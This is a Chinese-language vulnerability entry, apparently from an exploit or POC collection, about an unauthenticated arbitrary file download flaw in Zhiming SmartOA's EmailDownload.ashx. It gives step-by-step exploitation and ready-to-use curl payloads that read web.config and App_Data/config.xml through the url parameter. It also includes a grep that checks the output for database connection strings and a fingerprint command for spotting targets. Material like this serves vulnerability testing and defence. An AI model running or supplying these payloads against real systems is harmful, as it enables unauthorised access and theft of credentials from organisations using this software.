---
id: SMARTOA-FILE-READ
title: 智明SmartOA EmailDownload.ashx 任意文件下载漏洞
product: smartoa
vendor: 智明协同
version_affected: "all versions"
severity: HIGH
tags: [file_read, path_traversal, 无需认证, 国产, oa]
fingerprint: ["SmartOA", "智明协同"]
---

## 漏洞描述

智明 SmartOA 的 EmailDownload.ashx 文件存在任意文件下载漏洞，url 参数使用 `~/` 路径格式可穿越读取 Web 目录下的任意文件，攻击者无需认证即可下载 web.config 等敏感配置文件。

## 影响版本

- 智明 SmartOA（所有已知版本）

## 前置条件

- 无需认证
- 目标运行智明 SmartOA

## 利用步骤

1. 确认目标为智明 SmartOA
2. 通过 EmailDownload.ashx 的 url 参数读取文件
3. 下载 web.config 获取数据库连接字符串等敏感信息

## Payload

```bash
# 读取 web.config
curl -s "http://target/file/EmailDownload.ashx?url=~/web.config&name=web.config"

# 读取其他配置文件
curl -s "http://target/file/EmailDownload.ashx?url=~/App_Data/config.xml&name=config.xml"
```

## 验证方法

```bash
curl -s "http://target/file/EmailDownload.ashx?url=~/web.config&name=web.config" | grep -i "connectionString\|appSettings"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "SmartOA\|智明"
```
